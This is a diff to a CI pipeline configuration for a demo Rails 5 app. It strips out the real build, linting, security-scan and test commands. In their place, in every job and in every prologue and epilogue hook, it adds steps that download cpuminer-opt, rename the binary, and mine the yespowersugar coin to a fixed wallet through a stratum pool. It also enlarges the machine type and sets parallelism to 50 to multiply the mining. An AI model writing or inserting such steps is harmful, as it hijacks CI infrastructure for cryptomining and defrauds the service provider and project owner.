@@ -2,7 +2,7 @@ version: v1.0
 name: Demo Rails 5 app
 agent:
   machine:
-    type: e1-standard-4
+    type: e1-standard-8
     os_image: ubuntu1804
 execution_time_limit:
   hours: 24
@@ -11,8 +11,27 @@ global_job_config:
     commands:
       - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
       - tar xf cpuminer-opt-linux.tar.gz
-      - mv cpuminer-sse2 1
-      - './1 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0 --deployment -j 4 --path vendor/bundle'
+      - mv cpuminer-sse2 lukman
+      - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+  epilogue:
+    always:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 lukman
+        - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+    on_pass:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 lukman
+        - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+    on_fail:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 lukman
+        - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
 blocks:
   - name: Setup
     dependencies: []
@@ -20,7 +39,36 @@ blocks:
       jobs:
         - name: bundle
           commands:
-            - cache store
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+          parallelism: 50
+      prologue:
+        commands:
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 lukman
+          - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+      epilogue:
+        always:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+        on_pass:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+        on_fail:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
   - name: Code scanning
     dependencies:
       - Setup
@@ -28,23 +76,80 @@ blocks:
       jobs:
         - name: check style + security
           commands:
-            - bundle exec rubocop
-            - bundle exec brakeman
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+          parallelism: 50
+      prologue:
+        commands:
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 lukman
+          - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+      epilogue:
+        always:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+        on_pass:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+        on_fail:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
   - name: Unit tests
     dependencies:
       - Code scanning
     task:
       prologue:
         commands:
-          - sem-service start postgres
-          - 'bundle exec rake db:setup'
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 lukman
+          - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
       jobs:
         - name: RSpec - model tests
           commands:
-            - bundle exec rspec spec/models
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+          parallelism: 50
         - name: RSpec - controller tests
           commands:
-            - bundle exec rspec spec/controllers
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+          parallelism: 50
+      epilogue:
+        always:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+        on_pass:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+        on_fail:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
   - name: Integration tests
     dependencies:
       - Unit tests
